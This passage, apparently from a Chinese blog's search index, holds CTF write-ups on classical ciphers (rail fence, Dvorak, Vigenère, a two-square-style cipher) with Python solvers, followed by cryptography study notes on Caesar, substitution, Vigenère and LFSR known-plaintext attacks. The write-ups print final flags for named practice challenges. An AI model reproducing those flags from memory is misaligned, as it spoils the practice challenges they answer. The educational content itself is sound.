function_\">decrypt</span>(<span class=\"params\">key1, key2, enc_txt</span>):</span><br><span class=\"line\">    m1, m2 = cons_martix(key1), cons_martix(key2)</span><br><span class=\"line\">    cm = [<span class=\"built_in\">chr</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>) + <span class=\"number\">1</span>)]</span><br><span class=\"line\">    cm.remove(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(cm)</span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> i &lt; <span class=\"built_in\">len</span>(enc_txt):</span><br><span class=\"line\">        t1 = m1.find(enc_txt[i])</span><br><span class=\"line\">        t2 = m2.find(enc_txt[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">        x1, y1 = t1 // <span class=\"number\">5</span>, t1 % <span class=\"number\">5</span></span><br><span class=\"line\">        x2, y2 = t2 // <span class=\"number\">5</span>, t2 % <span class=\"number\">5</span></span><br><span class=\"line\">        res = res + cm[x1 * <span class=\"number\">5</span> + y2] + cm[x2*<span class=\"number\">5</span>+y1]</span><br><span class=\"line\">        i += <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">res = decrypt(res1, res2, enc_txt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(res, hashlib.md5(<span class=\"built_in\">bytes</span>(res, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>运行结果如下：</p>\r\n<blockquote>\r\n<p>{'P', 'B', 'D', 'A'}</p>\r\n<p>{'B', 'I', 'N', 'X', 'Y', 'K', 'L', 'E', 'D'}</p>\r\n<p>['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']</p>\r\n<p>whereismysecretkey</p>\r\n</blockquote>\r\n<p>得到flag：<code>whereismysecretkey</code></p></li>\r\n</ol>\r\n<h2 id=\"篱笆墙的影子\">篱笆墙的影子</h2>\r\n<ol type=\"1\">\r\n<li><p>打开文件发现内容为，推测为栅栏密码：<code>felhaagv&#123;ewtehtehfilnakgw&#125;</code></p></li>\r\n<li><p>编写脚本:</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 栅栏密码</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">s: <span class=\"built_in\">str</span>, n: <span class=\"built_in\">int</span>, pad_char: <span class=\"built_in\">int</span></span>) -&gt; <span class=\"built_in\">str</span>:</span><br><span class=\"line\">    m = <span class=\"built_in\">len</span>(s) // n  <span class=\"comment\"># 共多少组</span></span><br><span class=\"line\">    l = <span class=\"built_in\">len</span>(s) % n  <span class=\"comment\"># 补余数</span></span><br><span class=\"line\">    res = <span class=\"built_in\">list</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> l:</span><br><span class=\"line\">        pad_num = n - l</span><br><span class=\"line\">        <span class=\"keyword\">while</span> pad_num &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">            res.insert(-(pad_num-<span class=\"number\">1</span>)*m, <span class=\"built_in\">chr</span>(pad_char))</span><br><span class=\"line\">            pad_num -= <span class=\"number\">1</span></span><br><span class=\"line\">        res.append(<span class=\"built_in\">chr</span>(pad_char))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(res)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">s, n</span>):</span><br><span class=\"line\">    pad_s = pad(s, n, <span class=\"number\">1</span>)</span><br><span class=\"line\">    cates = <span class=\"built_in\">len</span>(pad_s) // n  <span class=\"comment\"># 组数</span></span><br><span class=\"line\">    res = [<span class=\"string\">&#x27;&#x27;</span>] * cates</span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> i &lt; <span class=\"built_in\">len</span>(pad_s):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cates):</span><br><span class=\"line\">            res[j] += pad_s[i+j]</span><br><span class=\"line\">        i += cates</span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span>.join(res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res.strip(<span class=\"built_in\">chr</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">loop</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>, <span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(decrypt(s, i))</span><br></pre></td></tr></table></figure></p>\r\n<p>得到flag为：<code>flag&#123;wethinkwehavetheflag&#125;</code></p></li>\r\n</ol>\r\n<h2 id=\"真的是键盘吗\">真的是键盘吗？</h2>\r\n<ol type=\"1\">\r\n<li>密文ypau_kjg;“g;”ypau+</li>\r\n<li>使用<a href=\"http://wbic16.xedoloh.com/dvorak.html\">解密网址</a>解密</li>\r\n<li>得到<code>flag&#123;this“is”flag&#125;</code></li>\r\n<li>对<code>this_is_flag</code>进行md5处理</li>\r\n<li>得到<code>951c712ac2c3e57053c43d80c0a9e543</code></li>\r\n</ol>\r\n<h2 id=\"vvvv\">VVVV</h2>\r\n<ol type=\"1\">\r\n<li>题目 查看压缩包，给出两个文件，分别为<code>encrypt.py</code>和<code>cipher</code>，查看encrypt.py，给出加密方式为维吉尼亚密码，查看cipher，发现内容为加密后的字符串。</li>\r\n<li>解题 使用脚本暴力破解或使用<a href=\"https://www.guballa.de/vigenere-solver\">在线网址</a>解密，得到flag为：<code>flag&#123;dvsksivtmjlochssoel&#125;</code></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["crypto","classical cryptography"]},{"title":"密码学","url":"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/","content":"<p>CTF密码学这方面学了大概半个月了，汇总一下密码学方面的知识吧，虽然不够完全，还有许多需要改进的地方，但还是总结一下，以防日后忘记 ^_^ 。</p>\r\n<h2 id=\"密码学概述\">密码学概述</h2>\r\n<p>密码学（Cryptography）一般可分为古典密码学和现代密码学。</p>\r\n<p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p>\r\n<ul>\r\n<li>单表替换加密（Monoalphabetic Cipher）</li>\r\n<li>多表替换加密（Polyalphabetic Cipher）</li>\r\n<li>奇奇怪怪的加密方式</li>\r\n</ul>\r\n<span id=\"more\"></span>\r\n<p>而现代密码学则起源于 20 世纪中后期出现的大量相关理论，1949 年香农（C. E. Shannon）发表了题为《保密系统的通信理论》的经典论文标志着现代密码学的开始。现代密码学主要包含以下几个方面：</p>\r\n<ul>\r\n<li>对称加密（Symmetric Cryptography），以 DES，AES，RC4 为代表。</li>\r\n<li>非对称加密（Asymmetric Cryptography），以 RSA，ElGamal，椭圆曲线加密为代表。</li>\r\n<li>哈希函数（Hash Function），以 MD5，SHA-1，SHA-512 等为代表。</li>\r\n<li>数字签名（Digital Signature），以 RSA 签名，ElGamal 签名，DSA 签名为代表。</li>\r\n</ul>\r\n<blockquote>\r\n<p>数据安全基于密钥而不是算法的保密</p>\r\n</blockquote>\r\n<p>其中，对称加密体制主要分为两种方式：</p>\r\n<ul>\r\n<li>分组密码（Block Cipher），又称为块密码。</li>\r\n<li>序列密码（Stream Cipher），又称为流密码。</li>\r\n</ul>\r\n<p>一般来说，密码设计者的根本目标是保障信息及信息系统的</p>\r\n<ul>\r\n<li>机密性（Confidentiality）</li>\r\n<li>完整性（Integrity）</li>\r\n<li>可用性（Availability）</li>\r\n<li>认证性（Authentication）</li>\r\n<li>不可否认性（Non-repudiation）</li>\r\n</ul>\r\n<p>其中，前三者被称为信息安全的 CIA 三要素。</p>\r\n<p>而对于密码破解者来说，一般是要想办法识别出密码算法，然后进行暴力破解，或者利用密码体制的漏洞进行破解。当然，也有可能通过构造虚假的哈希值或者数字签名来绕过相应的检测。</p>\r\n<p>一般来说，我们都会假设攻击者已知待破解的密码体制，而攻击类型通常分为以下四种：</p>\r\n<table>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>攻击类型</th>\r\n<th>说明</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>唯密文攻击</td>\r\n<td>只拥有密文</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>已知明文攻击</td>\r\n<td>拥有密文与对应的明文</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>选择明文攻击</td>\r\n<td>拥有加密权限，能够对明文加密后获得相应密文</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>选择密文攻击</td>\r\n<td>拥有解密权限，能够对密文解密获得相应明文</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<h2 id=\"古典密码学\">古典密码学</h2>\r\n<h3 id=\"单表替换加密\">单表替换加密</h3>\r\n<h4 id=\"凯撒密码\">凯撒密码</h4>\r\n<p>凯撒大帝在高卢参加竞选时，在与他的罗马朋友和同事的私人信件中使用了这种加密方法。这个密码对明文进行了简单的移位处理。 举例来说，如果明文是字母A，则向后移位3个字母，A被加密为D。同理，B被加密为E，C被加密为F，一直到W被加密为Z。对于X来说，移位3个字母超过了Z，则返回到字母A。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913155739118.png\" alt=\"caesar\"><figcaption aria-hidden=\"true\">caesar</figcaption>\r\n</figure>\r\n<p><strong>破解方式</strong>：遍历25种可能性，查看输出结果，人工判断解密结果</p>\r\n<p><strong>例题：</strong> 给定一段字符串密文<code>Wtaad, Iwxh xh Rpthpg Tcrgneixdc</code>，求其明文</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 凯撒密码</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_ks</span>(<span class=\"params\">s : <span class=\"built_in\">str</span></span>):</span><br><span class=\"line\">    ress = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">26</span>):</span><br><span class=\"line\">        res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i.isalpha():</span><br><span class=\"line\">                <span class=\"keyword\">if</span> i.islower():</span><br><span class=\"line\">                    base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)</span><br><span class=\"line\">                res += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) + j - base) % <span class=\"number\">26</span> + base)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                res += i</span><br><span class=\"line\">        ress.append(res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ress</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;Wtaad, Iwxh xh Rpthpg Tcrgneixdc&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># decrypt_ks(s)</span></span><br></pre></td></tr></table></figure>\r\n<h5 id=\"练习\">练习</h5>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BHBNIS2018%5Dcaesar\">[HBNIS2018]caesar</a></p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;gmbhjtdbftbs&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># decrypt_ks(s)</span></span><br></pre></td></tr></table></figure>\r\n<h4 id=\"简单替换\">简单替换</h4>\r\n<p>简单替换密码（Simple Substitution Cipher）加密时，将每个明文字母替换为与之唯一对应且不同的字母，与凯撒密码的区别在于其密码字母表的字母不是简单的位移，而且完全是混乱的，使得其破解难度高于凯撒密码。比如：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913155811688.png\" alt=\"simple-substitution\"><figcaption aria-hidden=\"true\">simple-substitution</figcaption>\r\n</figure>\r\n<p>将其对应关系整理成更易读的形式：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913155837499.png\" alt=\"simple-substitution-2\"><figcaption aria-hidden=\"true\">simple-substitution-2</figcaption>\r\n</figure>\r\n<p>而简单替换密码的密钥就是第二行的字母，即：</p>\r\n<blockquote>\r\n<p>WYHFXUMTJVSGENBRDZLQAPCOKI</p>\r\n</blockquote>\r\n<p><strong>示例</strong></p>\r\n<p>我们使用密钥: phqgiumeaylnofdxjkrcvstzwb，加密defend the east wall of the castle：</p>\r\n<p>首先写出密钥为1时明文和密文的对照表：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913155920433.png\" alt=\"simple-substitution-3\"><figcaption aria-hidden=\"true\">simple-substitution-3</figcaption>\r\n</figure>\r\n<p>对要加密的明文逐个查表替换：D替换为G、E替换为I... 依次类推，直到整段明文都被加密。</p>\r\n<blockquote>\r\n<p>plaintext: defend the east wall of the castle</p>\r\n<p>ciphertext: giuifg cei iprc tpnn du cei qprcni</p>\r\n</blockquote>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 代码实现</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SimpleSubstitution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, s</span>):</span><br><span class=\"line\">        self.__table = <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class=\"line\">        s = s.lower()</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(s) == <span class=\"number\">26</span> <span class=\"keyword\">and</span> <span class=\"built_in\">set</span>(s) == <span class=\"built_in\">set</span>(self.__table)</span><br><span class=\"line\">        self.__enc_dic = &#123;&#125;</span><br><span class=\"line\">        self.__dec_dic = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">            self.__enc_dic[<span class=\"built_in\">chr</span>(i+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))] = s[i]</span><br><span class=\"line\">            self.__dec_dic[s[i]] = <span class=\"built_in\">chr</span>(i+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">encipher</span>(<span class=\"params\">self, s</span>):</span><br><span class=\"line\">        text = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        s = s.lower()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            text += self.__enc_dic.get(i) <span class=\"keyword\">if</span> self.__enc_dic.get(i) <span class=\"keyword\">else</span> i</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">decipher</span>(<span class=\"params\">self, s</span>):</span><br><span class=\"line\">        text = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        s = s.lower()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            text += self.__dec_dic.get(i) <span class=\"keyword\">if</span> self.__dec_dic.get(i) <span class=\"keyword\">else</span> i</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\">ss = SimpleSubstitution(<span class=\"string\">&#x27;phqgiumeaylnofdxjkrcvstzwb&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># print(ss.encipher(&#x27;defend the east wall of the castle&#x27;))</span></span><br><span class=\"line\"><span class=\"comment\"># print(ss.decipher(&#x27;giuifg cei iprc tpnn du cei qprcni&#x27;))</span></span><br></pre></td></tr></table></figure>\r\n<h5 id=\"简单替换密码的密码分析\">简单替换密码的密码分析</h5>\r\n<p>虽然简单替换密码的密钥空间很大（密钥数量约为<span class=\"math inline\">\\(2^{88.4}\\)</span>），但是还是很容易被破解。因为在英语文本中有很多冗余或统计属性。</p>\r\n<p><strong>词频分析</strong></p>\r\n<p>自然英语每个字母出现的频率有着特殊的分布，所以我们首先计算密文中字母的频率分布。</p>\r\n<p>下图为自然英语的字母频率：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913155939726.png\" alt=\"frequent-analysis\"><figcaption aria-hidden=\"true\">frequent-analysis</figcaption>\r\n</figure>\r\n<p>这说明'e'是最常见的字母，出现概率约为13%，而z出现的概率却小于1%。经过简单替换密码加密后不会改变这些字母的频率，只会使它们的对应关系变得杂乱无章。</p>\r\n<p>在上一小节的示例中，'e'被加密为'i'，所以'i'在密文中变成了最常见的密文。密码分析人员必须通过这种方法，找到密文和明文中每个字符的映射关系。</p>\r\n<p>比如我们将密文中最常见的字母替换为'e'，第二常见的字母替换为't'，以此类推。</p>\r\n<p>解题网址：<a href=\"http://quipqiup.com/\" class=\"uri\">http://quipqiup.com/</a></p>\r\n<h5 id=\"练习-1\">练习</h5>\r\n<p><a href=\"https://buuoj.cn/challenges#%E5%87%AF%E6%92%92%EF%BC%9F%E6%9B%BF%E6%8D%A2%EF%BC%9F%E5%91%B5%E5%91%B5!\">凯撒？替换？呵呵！</a></p>\r\n<h4 id=\"多表替换\">多表替换</h4>\r\n<p>人类需要更加安全的加密方法。意大利文艺复兴时期的天才阿尔伯蒂(Leon BattistaAlberti)进一步改进了凯撒密码，并在加密过程中使用了多字母映射表。阿尔伯蒂的此种加密方法在1553年被意大利人贝拉索(Giovan Battista Bellaso)改进，并由法国人维吉尼亚(Blaise de Vigenere)所推广。因此，这个密码被称为「维吉尼亚密码」(Vigenere Cipher)。</p>\r\n<p>维吉尼亚密码是一个相对很安全的加密系统，自提出后的300多年间都未得到破解。因此，这一密码很长时间以来都享有至高荣誉:无法破译的密码(Le chiffre indechiffrable)。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160012030.png\" alt=\"vgny\"><figcaption aria-hidden=\"true\">vgny</figcaption>\r\n</figure>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160026901.png\" alt=\"vgny2\"><figcaption aria-hidden=\"true\">vgny2</figcaption>\r\n</figure>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160037083.png\" alt=\"vgny3\"><figcaption aria-hidden=\"true\">vgny3</figcaption>\r\n</figure>\r\n<p>加密结果：<code>LXFOPVEFRNHR</code></p>\r\n<p>然而，维吉尼亚密码也不是安全的。事实上，以维吉尼亚密码为代表的「多表代换密码」均有安全漏洞。1863年，德国人卡斯基(Friedrich Kasiski)公开了一份针对维吉尼亚密码等多表代换密码的破解方法，称为「卡斯基检测法」。不过有间接证据表明，早在1863年之前的10年，英国数学家巴贝奇(Charles Babbage)也提出了类似的破解方法。</p>\r\n<p><strong>解密网站</strong>：<a href=\"https://www.guballa.de/vigenere-solver\" class=\"uri\">https://www.guballa.de/vigenere-solver</a></p>\r\n<h5 id=\"重合指数\">重合指数</h5>\r\n<p>重合指数（Coincidence Index）：令 <span class=\"math inline\">\\(𝑥=𝑥_1 𝑥_2⋯𝑥_𝑛\\)</span> 为长度为 n 的字符串，定义此字符串 x 的重合指数为任取该字符串两个字母为相同的几率，即</p>\r\n<p><span class=\"math display\">\\[I(x)=\\frac{\\sum_{i=1}^{26}C_{p_i}^2}{C_n^2}\\]</span></p>\r\n<p>其中 <span class=\"math inline\">\\(𝑝_1,𝑝_2,⋯,𝑝_26\\)</span> 代表字母 𝑎,𝑏,𝑐,⋯,𝑧 在字符串 𝑥 中所出现的次数。C代表组合数。</p>\r\n<p>注：假设 x 为一篇普通的英文文章，且 n 很大，那么有</p>\r\n<p><span class=\"math display\">\\[𝐼(𝑥)≈|𝑊|=𝑤_1^2+𝑤_2^2+⋯+𝑤_{26}^2≈0.065\\]</span></p>\r\n<h5 id=\"练习-2\">练习</h5>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BMRCTF2020%5Dvigenere\">[MRCTF2020]vigenere</a></p>\r\n<h2 id=\"现代密码\">现代密码</h2>\r\n<h3 id=\"对称加密\">对称加密</h3>\r\n<p>加密和解密用的是同一个密码或者同一套逻辑的加密方式。</p>\r\n<p>这个密钥也叫对称秘钥，其实这个对称和不对称指的就是加密和解密用的<strong>秘钥</strong>是不是同一个。</p>\r\n<h4 id=\"流密码\">流密码</h4>\r\n<p>流密码一般逐字节或者逐比特处理信息。一般来说</p>\r\n<ul>\r\n<li>流密码的密钥长度会与明文的长度相同。</li>\r\n<li>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</li>\r\n</ul>\r\n<p>需要注意的是，流加密目前来说都是对称加密。</p>\r\n<p>伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。</p>\r\n<p>流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p>\r\n<p>流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。</p>\r\n<h5 id=\"移位寄存器\">移位寄存器</h5>\r\n<p>移位寄存器（Shift Register，SR）是指有若干个寄存器排成一行，每个寄存器中都存储着一个二进制数（0或1）。移位寄存器每次把最右端（末端）的数字输出，然后整体向右移动一位。假设一个5位移位寄存器中存储着数据10110，则不断移位、输出的效果如图所示：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160101570.png\" alt=\"shift_reg\"><figcaption aria-hidden=\"true\">shift_reg</figcaption>\r\n</figure>\r\n<h5 id=\"反馈移位寄存器\">反馈移位寄存器</h5>\r\n<p>在移位寄存器向右移位一位以后，左边就会空出一位（如上图所示），这时如果采用一个<strong>反馈函数</strong>，以寄存器中已有的某些序列作为反馈函数的输入，在函数中经过一定的运算后，将反馈函数输出的结果填充到移位寄存器的最左端，那么这样的移位寄存器就会有源源不断的输出。这样的，<strong>拥有反馈函数的移位寄存器称为反馈移位寄存器</strong>（Feedback Shift Register，FSR）。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160121725.png\" alt=\"fk_shift_reg\"><figcaption aria-hidden=\"true\">fk_shift_reg</figcaption>\r\n</figure>\r\n<h5 id=\"线性反馈移位寄存器\">线性反馈移位寄存器</h5>\r\n<p>如果反馈移位寄存器的<strong>反馈函数是线性函数</strong>（即只进行简单线性运算的函数），那么这种寄存器就被称为<strong>线性反馈移位寄存器</strong>（Linear Feedback Shift Register，LFSR）。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160136431.png\" alt=\"lfsr\"><figcaption aria-hidden=\"true\">lfsr</figcaption>\r\n</figure>\r\n<h5 id=\"lfsr流密码\">LFSR流密码</h5>\r\n<p>LFSR的反馈函数就是简单地对<strong>移位寄存器中的某些位进行异或，并将异或的结果填充到LFSR的最左端</strong>，如图所示。对于LFSR中每一位的数据，可以参与异或，也可以不参与异或。其中，我们把参与异或的位称为<strong>抽头</strong>。</p>\r\n<p><strong>LFSR的寄存器个数称为LFSR的级数</strong>，一个n级LFSR最多同时存放n位数据。</p>\r\n<p>加密思路：通过密钥K产生一个密钥流<span class=\"math inline\">\\(z=z_0z_1z_2…\\)</span>，并使用加密规则对明文串<span class=\"math inline\">\\(x=x_0x_1x_2…\\)</span>加密，得到加密后的密文<span class=\"math inline\">\\(y=y_0y_1y_2…=E_{z_0}(x_0)E_{z_1}(x_1)…\\)</span>，加密规则可以使用非常简单的加密算法（如简单的异或运算）。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160149259.png\" alt=\"stream_cipher\"><figcaption aria-hidden=\"true\">stream_cipher</figcaption>\r\n</figure>\r\n<p>其<strong>密钥流</strong>输出函数为<span class=\"math inline\">\\(f(x)≡c_n a_1+c_{n-1}a_2+⋯+c_1x_n\\mod 2\\)</span></p>\r\n<p>设初始密钥K为nbit，根据输出函数对用户明文进行加密过程：</p>\r\n<ol type=\"1\">\r\n<li>对于前n bit明文，直接使用初始密钥异或进行加密，得到n bit密文</li>\r\n<li>对于后续每bit明文，先根据输出函数得到密钥，再与明文进行异或得到密文。</li>\r\n</ol>\r\n<p>只使用LFSR来产生密钥是非常不安全的。下文将在几种情况下说明LFSR的易攻破性。</p>\r\n<p><strong>对LFSR的攻击</strong></p>\r\n<ol type=\"1\">\r\n<li><strong>已知LFSR的反馈函数和级数n：</strong></li>\r\n</ol>\r\n<p>在这种情况下，如果破译者已知连续n位明文 <span class=\"math inline\">\\(p_i, i\\in [1,n]\\)</span> ，和其对应的n位密文 <span class=\"math inline\">\\(c_i, i\\in [1,n]\\)</span> ，则可以计算得出n位密钥 <span class=\"math inline\">\\(a_i = m_i \\oplus c_i, i\\in [1,n]\\)</span>。这时，就已知了LFSR的一个状态，再根据反馈函数，即可计算出LFSR的全部密钥流，从而破解LFSR。</p>\r\n<p><span class=\"math display\">\\[(a_0\\ a_1\\ \\cdots\\ a_{n-1})\\cdot \\begin{pmatrix} c_0 \\\\ c_1 \\\\ \\vdots \\\\ c_{n-1} \\end{pmatrix}= (a_{n})\\]</span></p>\r\n<ol start=\"2\" type=\"1\">\r\n<li><strong>未知LFSR的反馈函数，但已知其级数n：</strong></li>\r\n</ol>\r\n<p>尽管这时我们失去了反馈函数的信息，但我们仍然可以拦截其连续<strong>2n位</strong>的明文 <span class=\"math inline\">\\(p_i, i\\in [1,2n]\\)</span> ，和其对应的<strong>2n位</strong>的密文 <span class=\"math inline\">\\(c_i, i\\in [1,2n]\\)</span> ，得到2n位的密钥 <span class=\"math inline\">\\(a_i = m_i \\oplus c_i, i\\in [1,2n]\\)</span>。 <strong>在这2n个密钥中，蕴含着LFSR的n+1种状态</strong>，分别为 <span class=\"math inline\">\\({a_1,a_2,\\cdots,a_n}\\)</span>，<span class=\"math inline\">\\({a_2,a_3,\\cdots,a_{n+1}}\\)</span>， <span class=\"math inline\">\\({a_3,a_4,\\cdots,a_{n+2}}\\)</span> ，......， <span class=\"math inline\">\\({a_{n+1},a_{n+2},\\cdots,a_{2n}}\\)</span> 。这些状态之间存在着相互的递推关系，例如<span class=\"math inline\">\\(a_{n+1}\\)</span>就是由 <span class=\"math inline\">\\({a_1,a_2,\\cdots,a_n}\\)</span> 计算出来的。以此类推， <span class=\"math inline\">\\(a_{i+n}\\)</span> 是由 <span class=\"math inline\">\\({a_{i},a_{i+1},\\cdots,a_{i+n-1}}\\)</span>计算出来的。由此，我们可以得出n个线性方程，构成一个线性方程组。</p>\r\n<p><span class=\"math display\">\\[(a_0\\ a_1\\ \\cdots\\ a_{n-1})\\cdot \\begin{pmatrix} 0 &amp; 0 &amp; \\cdots &amp; c_0 \\\\ 1 &amp; 0 &amp; \\cdots &amp; c_1 \\\\ 0 &amp; 1 &amp; \\cdots &amp; c_2 \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0 &amp; 0 &amp; \\cdots &amp; c_{n-1} \\end{pmatrix}= (a_1\\ a_2 \\ \\cdots\\ a_{n})\\]</span></p>\r\n<p><span class=\"math display\">\\[(a_0\\ a_1\\ \\cdots\\ a_{n-1})\\cdot \\begin{pmatrix} c_0 \\\\ c_1 \\\\ \\vdots \\\\ c_{n-1} \\end{pmatrix}= (a_{n})\\]</span></p>\r\n<p><span class=\"math display\">\\[\\begin{pmatrix} a_0 &amp; a_1 &amp; \\cdots &amp; a_{n-1} \\\\ a_1 &amp; a_2 &amp; \\cdots &amp; a_n \\\\ a_2 &amp; a_3 &amp; \\cdots &amp; a_{n+1} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ a_{n-1} &amp; a_n &amp; \\cdots &amp; a_{2n-2} \\end{pmatrix}\\cdot \\begin{pmatrix} c_0 \\\\ c_1 \\\\ \\vdots \\\\ c_{n-1} 